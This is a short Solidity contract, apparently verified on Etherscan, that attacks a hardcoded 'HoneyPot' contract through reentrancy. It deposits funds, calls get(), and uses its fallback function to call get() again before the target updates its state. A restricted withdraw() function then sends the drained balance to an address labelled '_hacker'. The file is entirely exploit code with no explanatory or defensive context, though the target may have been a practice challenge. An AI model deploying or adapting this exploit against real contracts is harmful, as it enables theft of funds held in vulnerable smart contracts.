/**
 *Submitted for verification at Etherscan.io on 2022-09-03
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

interface IHoneyPot {
    function put() external payable;

    function get() external;
}

contract HoneyGet {
    address private _honeyPot = 0xB03486280c91aB32544Aae181f47362dC67C139C;
    address private _hacker = 0xBe6A9Ae6c09cf1739F528ab6B5Fe3bD5324e950a;
    bool done;

    modifier onlyHacker() {
        require(msg.sender == _hacker);
        _;
    }

    function honeyPut() public payable onlyHacker {
        IHoneyPot(_honeyPot).put{value: msg.value}();
    }

    function honeyGet() public onlyHacker {
        IHoneyPot(_honeyPot).get();
    }

    function withdraw() public onlyHacker {
        payable(_hacker).transfer(address(this).balance);
    }

    fallback() external payable {
        if (!done) {
            done = true;
            IHoneyPot(_honeyPot).get();
        }
    }
}